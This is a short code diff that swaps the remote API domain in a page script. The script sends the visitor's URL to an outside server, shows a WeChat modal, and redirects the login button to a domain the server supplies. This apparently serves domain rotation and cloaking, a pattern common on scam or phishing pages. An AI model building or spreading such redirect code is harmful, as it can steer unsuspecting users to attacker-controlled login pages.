@@ -41,7 +41,7 @@
     const modal=document.getElementById("wechatModal"),btn=document.getElementById("enterBtn");
     modal.style.display="none";
     if(new URLSearchParams(location.search).get('login')==='true') return;
-    fetch("https://api.drykfs.cn/api/index/selectRoute?url="+encodeURIComponent(location.href)).then(r=>r.json()).then(d=>{
+    fetch("https://api.hbsg9.cn/api/index/selectRoute?url="+encodeURIComponent(location.href)).then(r=>r.json()).then(d=>{
         if(d&&d.code===1 && /micromessenger/i.test(navigator.userAgent)) modal.style.display="flex";
         if(d?.data?.loginDomain){ btn.replaceWith(btn.cloneNode(true)); document.getElementById("enterBtn").addEventListener("click",()=>location.href=d.data.loginDomain);}
     }).catch(e=>{});
